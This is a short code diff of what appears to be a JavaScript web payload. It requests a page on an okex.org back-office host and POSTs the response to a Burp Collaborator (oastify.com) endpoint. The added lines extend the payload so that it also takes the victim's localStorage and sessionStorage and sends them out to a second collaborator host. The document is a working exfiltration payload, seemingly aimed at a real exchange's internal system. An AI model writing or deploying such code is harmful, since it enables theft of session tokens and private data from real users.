@@ -8,16 +8,17 @@
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
-                // Send the response and headers to Burp Collaborator
-                fetch('https://rc7kqjj796bi0gmum2qny5cu0l6cu8qwf.oastify.com', {
+                // Retrieve local storage and session storage data
+                var localStorageData = JSON.stringify(localStorage);
+                var sessionStorageData = JSON.stringify(sessionStorage);
+                
+                // Send the response and local storage/session storage data to Burp Collaborator
+                fetch('https://zmps0rtfjelqaow2wa0v8dm2atgk4gx4m.oastify.com', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
                     body: JSON.stringify({
-                        url: 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297',
-                        responseText: xhr.responseText,
-                        headers: xhr.getAllResponseHeaders()
+                        response: xhr.responseText,
+                        localStorageData: localStorageData,
+                        sessionStorageData: sessionStorageData
                     })
                 });
             }
